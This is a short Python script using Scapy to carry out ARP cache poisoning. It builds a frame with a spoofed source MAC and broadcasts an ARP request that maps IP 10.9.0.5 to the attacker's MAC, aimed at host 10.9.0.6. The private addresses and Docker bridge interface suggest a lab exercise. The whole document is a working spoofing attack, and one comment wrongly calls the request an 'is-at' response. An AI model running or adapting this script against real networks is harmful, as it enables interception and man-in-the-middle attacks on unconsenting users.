#!/usr/bin/python3
from scapy.all import *

#MAC address of attacker 
attacker_mac_addr = "02:42:03:25:76:1f"

#MAC attacker we are trying to impersonate
impersonate_mac_addr = "02:42:0a:09:00:05"

#crafting the ethernet frame(broadcasting the arp to the entire network)
ether = Ether(src=impersonate_mac_addr,dst="ff:ff:ff:ff:ff:ff")

#creating ARP request (is-at operation means an ARP response)

arp= ARP(psrc="10.9.0.5",hwsrc=attacker_mac_addr,pdst="10.9.0.6")
arp.op = 1

#Creating the final frame and send
frame = ether/arp

#Sending the frame. Adding my interface
sendp(frame,iface="br-3cb06be4a02f")
